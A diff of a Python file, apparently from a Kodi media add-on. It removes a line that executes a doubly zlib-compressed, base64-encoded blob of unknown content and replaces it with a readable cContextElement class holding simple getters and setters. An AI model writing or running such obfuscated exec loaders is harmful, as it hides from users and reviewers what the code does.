@@ -1,3 +1,40 @@
+# -*- coding: utf-8 -*-
+# Python 3
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('eNoN0zWio1AAAMADUeBWbIG7E6yD8HALDqffP3cYYP/sqELPuZ8/cIbB6WLa/I7uYt6mezKdehkfrekjwYO0I4HwWR/+Lp6DClc5cUgW/SI4+0W0cHHCcdGdxNrtQC3pKSZkEljQMdHisSN6fCTi5VIMhctbPeE9XEGQ4m646RblALSifdYOdp6RSieRNstCu0ngxi105gQoihtqLxMHCdbKobBA8rMBLJ9nqtJM5z5fitPexTJqJdsGScjBgGl4uykwYQJWaDZb2gxlytQ3rLho1yIgPbcuKG8NzaJNgKdyxdg0V3Oefk796jTXCRp31oKc6BaXSobg4VgTr0z74z2gh3XYExGEs/eXwZnfoRho017KhPGvQ/ywnbqB/BiFJ4efIvuE9jwm6AunSE/QvpJb2uhN2sc8H5sgRwqN5s7DQ81Kr/RpQSjWAt7qkinoMl2nXLJyHpeqlqcAij7AgXwQSRc05rjf76Y9ZNYRwirCvqrO0EbCJo9OnpmRvH9bJm+rHSh8s4Z/ilUocWBDUJskbig1QnOSUsywkt7UtpF0z57GwjOfSXvl0tc0DUJkGPYw+1l8bHmnHXNXQdfv2HvXRuSurVZjdNw5tLV3RsedST6gJOfb5pf2jPhAiY3ghY7dSX74riljXawnb8+1LgW4adV0ThutxtflK9xTXT6cGGBdHbMHztQIR//byr0kgeA8xIfB0NOq7cQfODjRf5QE63qu4cl+7oXG2KGOGEnv+9DA3KM158f4OtJsMT5e0K1wsZaqsAv03aDN6VMApA1Fs+DQnwWP5K4RE1z90TxaWA/Gl0gQNytwdGNNv1xpnikSflCQgHXNldXGQ5KKKbinH8XFDxNCQBhzgwxRBHnr+QLLsfxUDeZQNCvXWXJ0mM1HhQHjEC5DrgcB8lx6P4m80LcXt3Fjef8cIls9iIWR6JZt9N7sXWSzZjbgqCZSPqgZa7/wG0ot/NQ+7/KiPTYpMP0ecjLJMSRIS0n6vliHyU/RbDbLZzcC274WHFVdo9tjpdSCjGhznei9i2TUahq3VDq+PMEM+gSr0vWq8fgj5Qj+jQvlwDYaiEgQggF+/FJPDZBW0PfK6iCOQYd80apjlJ0ZoM6AJJxBpcRCqlPAaIcZ4BKyQ/gqBv9J8u5UPdxtAkO+/wr6d/Fd3LwieppMLLNiZ/IO1edMNwxU1bL9CvwsGfivc0XIZRXb51G5kEJU6QnDXx8mKkbB92zAbIsAOXurLKLvMFnNcBGoE9QGVJlohPu63gHr0AqNZf9JDjmD3hdkJyHrytn/+w/4O505')))).decode('utf-8'))
+from resources.lib.handler.ParameterHandler import ParameterHandler
+
+
+class cContextElement:
+    def __init__(self):
+        self.__sTitle = ''
+        self.__oOutputParameterHandler = ParameterHandler()
+
+    def setFunction(self, sFunctionName):
+        self.__sFunctionName = sFunctionName
+
+    def getFunction(self):
+        return self.__sFunctionName
+
+    def setFile(self, sFile):
+        self.__sFile = sFile
+
+    def getFile(self):
+        return self.__sFile
+
+    def setTitle(self, sTitle):
+        self.__sTitle = sTitle
+
+    def getTitle(self):
+        return self.__sTitle
+
+    def setSiteName(self, sSiteName):
+        self.__sSiteName = sSiteName
+
+    def getSiteName(self):
+        return self.__sSiteName
+
+    def setOutputParameterHandler(self, oOutputParameterHandler):
+        self.__oOutputParameterHandler = oOutputParameterHandler
+
+    def getOutputParameterHandler(self):
+        return self.__oOutputParameterHandler
